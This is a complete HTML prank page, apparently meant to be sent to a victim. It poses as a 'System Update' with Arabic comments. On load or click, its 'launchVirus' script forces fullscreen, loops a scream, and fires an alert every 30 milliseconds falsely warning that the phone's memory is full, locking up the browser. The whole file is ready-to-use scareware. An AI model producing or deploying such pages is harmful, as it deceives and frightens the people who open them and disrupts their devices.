<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        /* إجبار الصورة على ملء الشاشة سواسوة */
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        img { width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; }
    </style>
</head>
<body onclick="launchVirus()">
    <img src="https://i.ibb.co/39snnynW/1000016067.jpg" alt="scary">
    
    <audio id="scream" loop src="https://www.soundboard.com/handler/DownloadTrack.ashx?cliptitle=Scary+Scream&filename=24/243645-77983652-326d-476b-9c71-29402513f56b.mp3"></audio>

    <script>
        function launchVirus() {
            // تفعيل ملء الشاشة
            document.documentElement.requestFullscreen();
            // تشغيل الصوت
            document.getElementById('scream').play();
            // اللاق اللانهائي (الخروج بسيف)
            setInterval(() => {
                alert("⚠️ خطأ في النظام: ذاكرة الهاتف ممتلئة تماماً!");
            }, 30);
        }
        // محاولة التشغيل بمجرد التحميل
        window.onload = launchVirus;
    </script>
</body>
</html>
